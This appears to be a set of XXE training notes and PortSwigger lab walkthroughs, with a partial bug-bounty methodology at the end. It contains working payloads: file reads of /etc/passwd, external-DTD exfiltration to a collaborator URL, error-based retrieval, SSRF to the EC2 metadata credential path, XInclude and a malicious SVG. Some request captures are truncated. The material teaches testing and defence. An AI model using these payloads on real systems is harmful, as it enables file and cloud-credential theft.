docs.text: Attack path Parser behavior Typical observable result Local file retrieval Resolves a file:// entity File content is reflected in the response XXE-powered SSRF Resolves an http:// or other network URI Internal response content or a side effect Blind XXE / OAST Resolves an attacker-controlled external URI DNS or HTTP interaction in a listener Parameter-entity XXE Resolves %name; while parsing the DTD Useful when ordinary entities are filtered External-DTD exfiltration Fetches a remote DTD that reads and sends a file File data appears in a request to the listener Error-based retrieval Places file content inside an invalid URI Parser error contains the target data XInclude Includes a resource into a server-generated XML document File content is inserted without a DOCTYPE Content-type conversion Treats a form or API request as XML A previously hidden XML parser becomes reachable SVG/image XXE Image processing parses attacker-controlled XML File data is rendered into or returned with the image

docs.title: How to find XXE attack surface
docs.text:
1. Map input formats. Look for application/xml, text/xml, SOAP, RSS, SVG, document imports, and APIs that accept multiple content types.
  2. Identify parser-backed features. Stock checks, upload processors, document converters, avatar processing, and integrations often parse XML behind the scenes.
  3. Inspect requests in Burp. Send a normal request to Repeater and identify the field that reaches the parser.
  4. Start with a harmless entity. A simple custom entity confirms whether the parser expands internal declarations.
  5. Test reflected and blind behavior separately. A missing value in the response does not prove that external resolution is disabled.
  6. Watch for side channels. DNS, HTTP, parser errors, timing changes, and secondary requests can all confirm processing.
  7. Check partial-control contexts. If you cannot inject a complete document or DOCTYPE, test XInclude and format-conversion paths.

docs.title: Safe detection sequence
docs.text: A controlled test can progress from low impact to higher impact:

docs.title: 1. Internal entity expansion
docs.text:
<!DOCTYPE foo [
    <!ENTITY probe "xxe-test">
]>
<stockCheck>
    <productId>&probe;</productId>
</stockCheck>

If xxe-test appears in the response, the parser is expanding custom entities.

docs.title: 2. Local-file confirmation
docs.text:
Use a non-sensitive, expected lab file such as /etc/hostname or the lab's documented target:

<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

docs.title: 3. Out-of-band confirmation
docs.text:
If the response does not include the entity value, use a collaborator or controlled listener domain:

<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "https://COLLABORATOR-SUBDOMAIN/">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

A DNS or HTTP interaction proves that the server attempted to resolve the external entity, even if no data is reflected.

docs.title: Parameter entities
docs.text:
Parameter entities are declared with % and are valid inside the DTD. They are useful when a filter blocks ordinary entity references in the XML body:

<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://COLLABORATOR-SUBDOMAIN/">
    %xxe;
]>

The parser resolves %xxe; while processing the DTD, before it processes the document body. Parameter entities are not ordinary XML-body substitutions; %name; belongs in the DTD, while &name; belongs in document content.

docs.title: Defensive checklist
docs.text:
• Disable DOCTYPE declarations when the application does not need them.
  • Disable external general entities and external parameter entities.
  • Disable external DTD loading and XInclude unless the feature is explicitly required.
  • Use a hardened, current XML parser configuration rather than relying on application-level filtering.
  • Restrict outbound network access from parser processes.
  • Treat uploaded SVG, XML, office documents, and other XML-derived formats as untrusted input.
  • Return generic parser errors; do not expose file paths or stack traces to clients.
  • Validate the expected content type and schema before parsing.
  • Add regression tests for local-file, SSRF, OAST, error-based, XInclude, and SVG payloads.
  • Log and alert on unexpected outbound requests from XML-processing services.

docs.title: Quick reference
docs.text: Question What to check Does the parser expand entities? Internal entity substitution Does it read local resources? file:// with an authorized lab file Does it make network requests? Collaborator/OAST interaction Are ordinary entities filtered? Parameter-entity declaration inside the DTD Is DOCTYPE unavailable? XInclude or a server-side XML-generation path Is the request not XML? Try an authorized content-type conversion test Is the feature an upload? SVG or another XML-derived format Is data not reflected? External DTD or error-based technique

docs.title: Labs in this section
docs.text:
Each page pairs the technique notes with its matching PortSwigger Web Security Academy lab walkthrough, in authorized-lab order.

  • Exploiting XXE to retrieve files — Notes and Lab
  • Exploiting XXE to perform SSRF attacks — Notes and Lab
  • Detecting Blind XXE with OAST — Notes and Lab
  • XML Parameter Entities — Notes and Lab
  • Blind XXE Exfiltration — Notes and Lab
  • Blind XXE via Error Messages — Notes and Lab
  • Hidden XXE Attack Surfaces — Notes and Labs
  • XXE Content-Type and Image Upload Paths — Notes and Lab

docs.title: Exploiting blind XXE to retrieve data via error messages
docs.text: Error-based blind XXE uses the parser's own error handling as a side channel. The target file is read into a parameter entity and then inserted into the path of a deliberately invalid resource. If the application returns the parser exception, the path contains the file content.

docs.title: Dynamic error entity
docs.text:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

docs.title: Execution sequence
docs.text:
1. %file reads the target file.
  2. %eval dynamically creates %error.
  3. %error attempts to load a path that does not exist.
  4. The invalid path contains the value read by %file.
  5. The parser raises an exception.
  6. A verbose application response may expose the exception path and therefore the file content.

docs.title: Preconditions
docs.text:
• External parameter entities must be enabled.
  • The parser must attempt to resolve the invalid resource.
  • The application must return useful parser errors.
  • The error channel must be large enough for the target value.

docs.title: Advantages and limitations
docs.text:
This approach does not require an outbound callback, so it can work when network egress is blocked. It depends on verbose errors, can truncate long files, and can fail when special characters in the file value invalidate the generated URI.

The dedicated lab walkthrough preserves the complete request and response captured in the source material.

docs.title: Lab walkthrough: Blind XXE retrieval via error messages
docs.text: This lab parses XML but does not display normal entity values. It provides an exploit server where a malicious external DTD can be hosted. The objective is to make the parser return an error containing /etc/passwd.

docs.title: 1. Host the external DTD
docs.text:
Place the following content on the lab exploit server:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

The invalid /nonexistent/ path is intentional. When the parser expands %file, the file contents become part of the path in the resulting error.

docs.title: 2. Load the external DTD
docs.text:
The source capture uses an XML stock-check request like this. Replace the host, session, and exploit-server values with fresh lab values:

POST /product/stock HTTP/2
Host: 0abe009a04ecf3ed805a0866004c00f1.web-security-academy.net
Cookie: session=wbxzmJq9I7xIMT6LOa9n8vORs8SNf05l
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abe009a04ecf3ed805a0866004c00f1.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 234
Origin: https://0abe009a04ecf3ed805a0866004c00f1.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER.example/exploit">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>

docs.title: Why the attack works
docs.text: The parser includes the resolved entity value in a file path before raising the exception. Because the application returns verbose parser errors, the error becomes a data-exfiltration channel even though normal XML values are not reflected.

docs.title: Exploiting Blind XXE to Exfiltrate Data Out-of-Band
docs.text:
When the vulnerable application's response does not contain the entity value, a second channel is needed. An attacker-controlled external DTD can make the target read a local file and then request a listener URL containing that value.

Use a controlled target and listener

Keep the listener and target inside the lab or an explicitly authorized assessment. Use a short, non-sensitive file such as /etc/hostname while validating the technique.

docs.title: Stage 1: host the external DTD
docs.text:
The external DTD is hosted on an exploit server or another controlled endpoint. A generic example is:

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'https://COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfiltrate;

docs.title: Entity expansion order
docs.text:
1. %file reads the local file into a parameter entity.
  2. %eval dynamically declares %exfiltrate and embeds the file value in the URL.
  3. %eval; executes that dynamic declaration.
  4. %exfiltrate; causes the target server to request the listener URL.
  5. The listener records the query parameter.

docs.title: Stage 2: load the DTD from the application
docs.text:
Inject a document type declaration that points to the hosted DTD:

<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER.example/exploit">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

The target parser fetches the DTD and processes its declarations server-side. The browser does not need to access the local file.

docs.title: Practical limitations
docs.text:
• Files containing newlines or reserved URL characters can break a query-string exfiltration.
  • Use a short single-line file such as /etc/hostname for the lab before attempting anything larger.
  • URL encoding may be required, but encoding support varies by parser.
  • HTTP egress controls, DNS filtering, parser hardening, and DTD restrictions can prevent the callback.
  • FTP or another supported scheme may be an alternative in a controlled lab, but do not assume it is enabled.

docs.title: Evidence and remediation
docs.text: The proof is a request arriving at the listener with the expected file value. Defend against this class by disabling external entities and external DTDs, restricting outbound traffic, and treating parser processes as untrusted network clients.

docs.title: Lab walkthrough: Blind XXE exfiltration using a malicious external DTD
docs.text:
This lab parses XML but does not display the result. The goal is to exfiltrate /etc/hostname through an external DTD hosted on the supplied exploit server or through the permitted Burp Collaborator service.

Use the lab values only

The domains, cookies, and collaborator values in captured requests are lab-session data. Generate fresh values when repeating the exercise.

docs.title: 1. Prepare the external DTD
docs.text:
Host a DTD on the lab exploit server. The source material uses the following pattern:

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;

/etc/hostname is a practical lab target because it is usually short and does not contain the newline-heavy output that can break a URL.

docs.title: 2. Load the DTD from the vulnerable request
docs.text:
Use an internal subset to fetch the hosted DTD:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER.example/exploit">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

The target server fetches the external DTD, reads the local file, and makes the exfiltration request. The application response can remain empty or generic.

docs.title: 3. Burp request from the source capture
docs.text:
The following preserves the request structure supplied with the lab material. Replace the host, session, and exploit-server values with fresh lab values:

    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

docs.title: 4. Verify the callback
docs.text: Poll the listener and locate the request containing the hostname in the x parameter. The request arriving at the listener is the proof that the target parsed the external DTD and executed its parameter entities.

docs.title: Troubleshooting
docs.text:
• Use a short file first; newline characters can invalidate a URL.
  • Confirm that the exploit server response is a valid DTD and is reachable by the lab.
  • Ensure %xxe; is inside the DOCTYPE declaration.
  • Use a new collaborator token if the result is mixed with older interactions.

docs.title: Detecting blind XXE using out-of-band (OAST) techniques
docs.text: In a blind XXE vulnerability, the server processes an external entity but does not include the result in its response. A missing response value is therefore not proof that XXE is absent. Out-of-band application security testing (OAST) confirms processing by watching for a DNS or HTTP interaction from the target server.

docs.title: Detection payload
docs.text:
Obtain a unique interaction domain from an authorized Burp Collaborator or equivalent OAST service, then use it in a harmless entity:

<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "https://COLLABORATOR-SUBDOMAIN/">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

docs.title: How the confirmation works
docs.text:
1. The application receives the XML.
  2. The parser reads the DTD and attempts to resolve xxe.
  3. The target server performs a DNS lookup and/or HTTP request.
  4. The OAST client records the interaction, even though the application response contains no file data.

docs.title: Burp workflow
docs.text:
1. Open the application's XML-backed feature and send a normal request to Repeater.
  2. Generate a unique Collaborator payload.
  3. Insert the domain into the external entity declaration.
  4. Send the request once, then poll the Collaborator client.
  5. Correlate the interaction timestamp and unique token with the request.

docs.title: Interpreting results
docs.text:
• DNS only: The parser resolved the host but may have been unable to complete HTTP.
  • HTTP request: The parser reached the external resource and processed a network entity.
  • No interaction: Recheck the request location, content type, parser behavior, outbound filtering, and whether the lab requires a parameter entity.

OAST proves a server-side interaction. It does not, by itself, prove that arbitrary local files can be read or exfiltrated.

docs.title: Lab walkthrough: Blind XXE with out-of-band interaction
docs.text:
The stock-check feature parses XML but does not display the resolved value. The objective is to confirm blind XXE by making the parser issue a DNS lookup and HTTP request to Burp Collaborator.

Use the lab's permitted OAST service

The Academy firewall blocks arbitrary external systems. Use the default public Burp Collaborator server supplied by the lab environment.

docs.title: 1. Capture the request
docs.text: Open a product, trigger Check stock, and send the XML request to Repeater.

docs.title: 2. Generate a Collaborator payload
docs.text:
In Burp, open the Collaborator client and copy a unique public payload. Use that value in the external entity:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://COLLABORATOR-SUBDOMAIN/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>

docs.title: 3. Send and poll
docs.text: Send the modified request once, then poll the Collaborator client. No useful file content needs to appear in the application response.

docs.title: 4. Confirm the interaction
docs.text: A DNS lookup or HTTP request containing the unique Collaborator token confirms that the server resolved the external entity. The interaction is the evidence of XXE.

docs.title: Troubleshooting
docs.text:
• Generate a fresh Collaborator domain and ensure it is copied exactly.
  • Keep the entity reference in a field the parser processes.
  • Check that the request remains valid XML after editing.
  • Poll after sending; the interaction may arrive asynchronously.
  • If only DNS is visible, the server may be unable to complete the HTTP request.

docs.title: Exploiting XXE to perform SSRF attacks
docs.text: XXE can become server-side request forgery (SSRF) when the external entity points to a network URL instead of a local file. The request is made by the vulnerable server, so it may reach internal services that are not accessible from the tester's browser.

docs.title: Basic network entity
docs.text:
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal.example/">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

If the application reflects the entity value, the response may contain the internal service's response. If it does not, the request can still cause an observable side effect or be confirmed through an authorized listener.

docs.title: Cloud metadata example
docs.text:
The source lab uses the link-local EC2 metadata address:

http://169.254.169.254/

A controlled lab probe can begin with:

<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

If the response exposes a directory listing, follow the paths returned by the lab rather than guessing. A typical legacy metadata traversal is:

/latest/meta-data/
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/ROLE_NAME

The final path may return temporary credential material in the lab. Do not test cloud metadata endpoints outside an explicitly authorized environment.

docs.title: Two-way versus blind SSRF
docs.text:
• Two-way SSRF: The internal response is inserted into the application's response.
  • Blind SSRF: The server makes the request but hides the response. Look for timing, state changes, DNS/HTTP callbacks, or other lab-defined evidence.

docs.title: Impact
docs.text: XXE-powered SSRF can enable internal reconnaissance, access to admin interfaces, interaction with internal APIs, cloud metadata exposure, and chained attacks against services that trust internal traffic.

docs.title: Parser and protocol limits
docs.text: The parser may restrict schemes, redirects, authentication, or response size. http://, https://, file://, and other schemes are parser-specific; never assume that a scheme is accepted without testing in an authorized lab.

docs.title: Defenses
docs.text: Disable external entity resolution first. Also apply egress filtering, isolate metadata services, require modern metadata protections, and avoid exposing internal response bodies to users.

docs.title: Lab walkthrough: Exploiting XXE to perform SSRF attacks
docs.text: The stock-check feature parses XML and reflects unexpected values. The lab exposes a simulated EC2 metadata service at http://169.254.169.254/. The objective is to use XXE-powered SSRF to obtain the simulated instance's IAM secret access key.

docs.title: 1. Establish the stock-check flow
docs.text: Open a product, use Check stock, and capture the request in Burp Repeater.

docs.title: 2. Probe the metadata root
docs.text:
Replace the entity target with the metadata address:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>

The request is made by the lab server, not by your browser. If the result is reflected, the response reveals the next metadata path.

docs.title: 3. Follow the metadata paths
docs.text:
Use the returned directory names to build the next entity URL. A typical path sequence is:

http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

For example, the final request body becomes:

<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>

Replace ROLE_NAME with the role returned by the preceding request. Do not hard-code a role name unless the lab response provides it.

docs.title: 4. Confirm the simulated credentials
docs.text: The final response contains the lab's simulated IAM material, including the secret access key. The important observation is that the application server fetched a link-local resource that was not directly available to the client.

docs.title: Why the attack works
docs.text:
The XML parser is allowed to resolve an HTTP external entity. Because the resolver runs in the server's network context, it can reach the metadata address and return the result through the vulnerable application.

Cloud safety

Never probe 169.254.169.254 or cloud credentials on infrastructure without explicit authorization. Use the supplied lab only.

docs.title: Exploiting XXE to retrieve files
docs.text: A reflected XXE vulnerability occurs when an application parses attacker-controlled XML, resolves an external entity, and includes the resolved value in its response. The simplest useful proof is reading a harmless lab file such as /etc/hostname; the source material demonstrates the same technique with /etc/passwd.

docs.title: Normal XML request
docs.text:
The application expects a stock-check document:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>

Before testing, send the original request through Burp Repeater so the baseline status code and response are recorded.

docs.title: File-retrieval payload
docs.text:
Add an internal DTD that declares an external entity, then reference the entity in a field that is reflected or used in an error message:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>

docs.title: What the parser does
docs.text:
1. Reads the DOCTYPE declaration.
  2. Creates the xxe entity with a file:// system identifier.
  3. Resolves the file when it encounters &xxe;.
  4. Inserts the file content into productId.
  5. Passes the resulting value to the application.

A vulnerable application may respond with something similar to:

Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

docs.title: Testing workflow
docs.text:
1. Identify an endpoint that accepts XML.
  2. Send an ordinary request and save the baseline response.
  3. Add the DOCTYPE and a harmless authorized target.
  4. Place &xxe; in each candidate data node one at a time.
  5. Compare response bodies, status codes, error messages, and timing.
  6. If the value is not reflected, move to the blind XXE lab techniques in this section.

docs.title: Constraints
docs.text:
• The parser must permit DOCTYPE declarations and external entities.
  • The process must have permission to read the selected file.
  • The entity must be placed in a location that reaches the application or its error handling.
  • XML escaping and parser-specific restrictions can change the result.

docs.title: Remediation
docs.text: Disable DTD and external entity resolution by default. If XML must be accepted, use a hardened parser configuration, restrict the permitted schema, prevent outbound network access, and return generic parser errors.

docs.title: Lab walkthrough: Exploiting XXE using external entities to retrieve files
docs.text: This lab's Check stock feature parses XML and returns unexpected values in its response. The objective is to use an external entity to retrieve /etc/passwd.

docs.title: 1. Open the product and identify the feature
docs.text: Visit the lab, open the details page for any product, and locate Check stock.

docs.title: 2. Generate a normal stock request
docs.text: Scroll to the stock-check control and submit it once. This gives you the normal XML request and a baseline response.

docs.title: 3. Send the request to Repeater
docs.text: Intercept the request with Burp Suite and send it to Repeater so the XML body can be edited without changing the browser flow.

docs.title: 4. Add the external entity
docs.text:
Replace the body with the following lab payload. Keep the surrounding element names expected by the application.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>

The DOCTYPE declares xxe, and &xxe; causes the parser to substitute the contents of /etc/passwd into productId.

docs.title: 5. Confirm the result
docs.text:
Send the request. A vulnerable response includes file content, commonly beginning with entries such as:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

The lab is solved when the application processes the external entity and exposes the target file.

docs.title: Why the attack works
docs.text: The server trusts the XML document's DOCTYPE and allows a file:// system identifier. The application then reflects the resolved value in an error or stock response. A hardened parser would reject the declaration or refuse to resolve the external resource.

docs.title: Finding hidden attack surface for XXE injection
docs.text: Not every XXE vulnerability begins with a request whose body is visibly XML. XML may be generated server-side from form fields, API parameters, SOAP values, document uploads, or image metadata. The key question is whether attacker-controlled data reaches an XML parser.

docs.title: XInclude
docs.text:
XInclude can assemble an XML document from external resources. It is useful when you control only a fragment of a document and cannot inject a complete DOCTYPE declaration:

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

docs.title: Required parts
docs.text:
1. xmlns:xi declares the XInclude namespace.
  2. xi:include requests an external resource.
  3. parse="text" keeps the resource as text instead of parsing it as XML.
  4. href identifies the authorized lab file or URL.

docs.title: Where to look
docs.text:
• Client data to SOAP: A server embeds a user-controlled value into a SOAP document.
  • Form fields to XML: A normal form is converted to an XML template before processing.
  • API parameters to XML: JSON or query parameters are transformed into an XML request.
  • Document and image uploads: SVG, office documents, and other XML-derived formats are parsed by libraries.
  • Content-type negotiation: A normal endpoint may accept both form data and XML.

docs.title: Detection strategy
docs.text:
1. Map parameters that are copied into downstream requests.
  2. Compare the behavior of form, JSON, and XML content types.
  3. Inspect error messages for XML parser names or stack traces.
  4. Test an authorized XInclude payload when DOCTYPE injection is unavailable.
  5. Check upload processors and image-rendering paths separately from normal API requests.

docs.title: Advantages and limitations
docs.text:
XInclude does not require a DOCTYPE, and partial input control can be enough. The parser must support XInclude, the generated document must be processed after the injection, and the application must not disable the feature.

The companion lab demonstrates the complete request and response for file retrieval through XInclude.

docs.title: Lab walkthrough: XInclude file retrieval
docs.text: This lab embeds the productId value inside a server-side XML document before parsing it. Because the request does not give direct control over the complete XML document, a classic DOCTYPE injection is not available. The objective is to inject an XInclude statement and retrieve /etc/passwd.

The application expects form data such as:

The server places productId into a larger XML document. Injecting a complete DOCTYPE would break the surrounding document, but an XInclude element can be inserted as the value.

docs.title: Why XInclude works here
docs.text:
The application does not give the tester control of the whole XML document, so a traditional DTD is not required. XInclude is processed later by an XML-aware parser and can include a resource from a single injectable field.

Do not generalize the target

The /etc/passwd path is used because it is the supplied lab objective. Use only files and systems explicitly authorized for testing.

docs.title: XML Parameter Entities for Bypassing Defenses
docs.text: Some parsers or application filters block ordinary entity references such as &xxe; in the XML body while still allowing declarations inside a DTD. Parameter entities provide a different resolution path: they are declared and referenced with % and are valid inside the DTD.

docs.title: Syntax
docs.text:
Declaration:

<!ENTITY % myparam "parameter value">

Reference:

%myparam;

Parameter entities are not ordinary body substitutions. %name; belongs in the DTD; &name; belongs in document content.

docs.title: Blind detection payload
docs.text:
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://COLLABORATOR-SUBDOMAIN/">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
</stockCheck>

When the DTD is parsed, %xxe; causes the server to request the collaborator domain. Monitor the OAST client for the interaction.

docs.title: Why it can bypass a filter
docs.text:
1. The filter may search only for &xxe; in application data.
  2. Parameter entities are expanded during DTD processing.
  3. The external request occurs before the application handles the normal element values.
  4. The body can remain an ordinary-looking stock-check document.

docs.title: Troubleshooting
docs.text:
• Confirm that the parser allows a DOCTYPE at all.
  • Put the parameter-entity reference inside the internal subset.
  • Use a fresh, unique OAST domain for each request.
  • Check whether the parser blocks external parameter entities separately.
  • Compare a regular external-entity request and a parameter-entity request so the control is clear.

docs.title: Lab walkthrough: Blind XXE with out-of-band interaction via XML parameter entities
docs.text:
This stock-check lab parses XML but blocks requests containing regular external entities and does not show unexpected values. The objective is to use a parameter entity to trigger a DNS and HTTP interaction with Burp Collaborator.

Use the lab's permitted OAST service

The Academy firewall blocks arbitrary external systems. Use the default public Burp Collaborator server supplied by the lab environment.

docs.title: 1. Capture the baseline request
docs.text: Open a product, run Check stock, and send the request to Repeater.

docs.title: 2. Declare a parameter entity
docs.text:
Generate a unique Collaborator payload and place it in a parameter entity inside the DTD:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://COLLABORATOR-SUBDOMAIN/">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

Unlike &xxe;, the %xxe; reference is expanded while the DTD is being parsed.

docs.title: 3. Send and poll Collaborator
docs.text: Send the request, then poll the Collaborator client for the unique token.

docs.title: Why this bypass works
docs.text: The lab filters ordinary external entities in document content, but still permits external parameter entities in the DTD. The parser therefore makes the outbound request before processing the stock-check elements.

docs.title: XXE attacks via modified content type
docs.text: A request does not have to begin as XML to expose an XXE attack surface. Some backends support multiple representations of the same operation. Converting a form request to XML can reveal a parser path that was not visible in the normal browser flow.

docs.title: Original form request
docs.text:
POST /endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param1=value1&param2=value2

docs.title: XML representation
docs.text:
POST /endpoint HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<request>
    <param1>value1</param1>
    <param2>value2</param2>
</request>

docs.title: Testing methodology
docs.text:
1. Identify a POST endpoint that accepts user-controlled values.
  2. Save a working baseline request and response.
  3. Change the content type to text/xml or application/xml.
  4. Convert parameters into XML elements while preserving the operation's meaning.
  5. Add a harmless entity or a controlled OAST probe.
  6. Compare parser errors, response behavior, and server-side callbacks.

A form request such as:

userId=123&name=test

may become:

<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<request>
    <userId>123</userId>
    <name>&xxe;</name>
</request>

docs.title: What to look for
docs.text:
• XML parser error messages after changing the content type.
  • A different status code or response structure.
  • XML-specific validation errors.
  • DNS or HTTP interactions from an authorized OAST domain.
  • Backends that accept text/xml, application/xml, or application/xhtml+xml.

docs.title: Defensive guidance
docs.text: Accept only the representation the endpoint is designed to process. Enforce content-type and schema validation, reject unexpected parser features, disable external entities, and test all supported representations consistently.

docs.title: Lab walkthrough: XXE via image file upload
docs.text: This lab lets users attach avatars to comments. The server uses Apache Batik to process SVG images, and Batik parses the uploaded SVG as XML. The objective is to upload an SVG containing an external entity that renders /etc/hostname, then submit the displayed hostname.

docs.title: 1. Identify the image-processing path
docs.text: Open a blog post, start a comment, and inspect the avatar upload field. The important detail is that an SVG is not just an image: it is XML and can contain a DOCTYPE declaration.

docs.title: 2. Build the malicious SVG
docs.text:
Use an external entity that reads the lab hostname and place the entity reference inside an SVG text element:

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

The SVG renderer expands &xxe; while processing the image and draws the result into the generated image.

docs.title: 3. Submit the multipart request
docs.text:
The source capture contains the following request structure. Session and CSRF values are lab-specific and should be regenerated:

docs.title: 4. Read the rendered hostname
docs.text: After the comment is submitted, view the processed avatar. The rendered text contains the server hostname. Enter that value through the lab's Submit solution control.

docs.title: Why this works
docs.text: The application treats a user-uploaded SVG as an image but sends it to an XML-aware library. The library accepts external entities and performs file resolution in the server's context. Restricting the upload extension alone would not be sufficient; SVG parsing must also be hardened or isolated.

docs.title: Defensive controls
docs.text:
• Reject SVG uploads when SVG is not required.
  • Sanitize SVG with a parser configured to disable DTDs and external entities.
  • Rasterize uploads in an isolated process with no sensitive filesystem access.
  • Serve uploaded files from a separate origin and prevent active content from being interpreted by the application.

docs.title: Bug bounty methodology
docs.text:
A good bug bounty workflow is not a race to send the most payloads. It is a repeatable loop: understand the program rules, map the target, form a testable hypothesis, change one trust assumption at a time, prove the smallest safe impact, and report it clearly.

The goal of each step

Every phase should produce something useful for the next phase. Scope produces a target list, discovery produces an attack-surface map, testing produces observations, validation produces evidence, and reporting turns the evidence into a fixable finding.

Stay inside the program

Test only assets, accounts and actions allowed by the program. Respect rate limits, exclusions, automation rules and disclosure requirements. Use test accounts and stop when the impact is clear; do not access unrelated user data or create unnecessary load.

docs.title: The complete workflow at a glance
docs.text: Phase Question Useful output 1. Read the rules What may be tested, how, and during which window? Saved scope, exclusions, contacts, rate limits and evidence location 2. Discover assets What approved domains, applications, APIs, mobile clients and third-party services exist? Normalized asset list with source and confidence 3. Map the application Which routes, roles, objects, states and integrations are reachable? Anonymous/authenticated sitemap and request inventory 4. Establish identities How do login, registration, reset, MFA, SSO and sessions create trust? Account matrix and session/token lifecycle notes 5. Test boundaries Does the server enforce identity, authorization, validation and business rules? Reproducible observations with request/response comparisons 6. Validate impact What is the smallest safe proof of the security consequence? Redacted evidence, affected boundary and business impact 7. Report Can another person reproduce and fix the issue? Clear report with steps, impact, severity and remediation 8. Retest and close Did the fix remove the root cause without introducing a new path? Retest result, final evidence and status

docs.title: 1. Read the program rules first
docs.text:
Before touching a target, record the program name, in-scope assets, out-of-scope assets, testing window, allowed automation, request limits, prohibited actions, account requirements and disclosure process.

A hostname that looks related is not automatically in scope. A third-party service, a staging system or an acquired brand may require separate permission. Keep the program rules with the notes so an interesting lead cannot silently become an unauthorized test.

docs.title: Prepare the test workspace
docs.text: Create separate locations for raw observations, normalized lists, requests, screenshots and report evidence. Use dedicated test accounts and unique harmless markers so results can be tied to your activity without touching real customer data.

docs.title: 2. Discover and prioritize the attack surface
docs.text:
Start with the assets the program has approved, then use low-noise sources to understand their relationships. Look for domains, subdomains, virtual hosts, API hosts, mobile endpoints, documentation, JavaScript routes, cloud storage and third-party integrations.

The result should not be the largest possible list. It should be a trustworthy map with:

  • Asset name, URL, IP or provider.
  • Source and time first observed.
  • Whether ownership and program scope are confirmed.
  • Service, technology, version and authentication state.
  • Interesting routes, parameters, files, roles or integrations.
  • A confidence level and a clear next action.

Prioritize assets that expose valuable functionality, unusual trust boundaries, forgotten versions, administrative workflows or sensitive integrations. Do not treat a scanner result as a finding until it is manually understood.

docs.title: 3. Map the application before testing it
docs.text:
Capture anonymous and authenticated traffic separately. Browse the application normally before trying to break a control. Record:

  • Routes, methods, parameters and content types.
  • Objects such as users, orders, files, projects and messages.
